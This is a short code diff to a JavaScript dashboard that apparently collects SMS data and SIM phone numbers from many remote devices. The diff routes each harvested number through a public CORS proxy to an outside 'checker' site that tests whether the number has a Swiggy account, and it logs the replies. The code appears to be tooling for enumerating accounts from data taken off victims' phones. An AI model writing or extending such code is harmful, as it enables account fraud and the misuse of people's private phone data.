@@ -375,7 +375,7 @@
         let allDevices = [];
         let allSmsData = {};
         let isChecking = false;
-        let swiggyStatusMap = {}; // Store status for each device ID
+        let swiggyStatusMap = {};
 
         // ===== LOAD DATA =====
         async function loadData() {
@@ -524,7 +524,7 @@
                 const lastSeen = device.lastSeen || 'N/A';
                 const deviceId = device.device_id;
                 
-                // Process SIM1
+                // Process SIM1 - keep original format
                 if (sim1 && sim1 !== 'Insert SIM card!' && sim1 !== 'Number not available' && sim1 !== 'No SIM') {
                     let clean = sim1.replace(/[\s\-\(\)]/g, '');
                     if (clean.length >= 10 && !seenNumbers.has(clean)) {
@@ -546,11 +546,19 @@
             return items;
         }
 
+        // ===== FIXED: Using CORS proxy =====
         async function checkSwiggyNumber(number) {
             try {
                 console.log(`🔍 Checking number: ${number}`);
-                const response = await fetch(`https://acczone.xyz/checker/swiggy.php?number=${number}`);
+                
+                // Use a CORS proxy to bypass the restriction
+                const proxyUrl = 'https://corsproxy.io/?';
+                const targetUrl = `https://acczone.xyz/checker/swiggy.php?number=${encodeURIComponent(number)}`;
+                
+                const response = await fetch(proxyUrl + targetUrl);
                 const text = await response.text();
+                
+                console.log(`📝 Response for ${number}:`, text.substring(0, 300));
                 
                 // Check for "registered" class or text
                 if (text.includes('registered') && !text.includes('not-registered')) {
@@ -604,7 +612,7 @@
                 return;
             }
 
-            // Reset all statuses
+            // Reset all statuses to 'checking'
             swiggyStatusMap = {};
             allDevices.forEach(d => {
                 swiggyStatusMap[d.device_id] = 'checking';
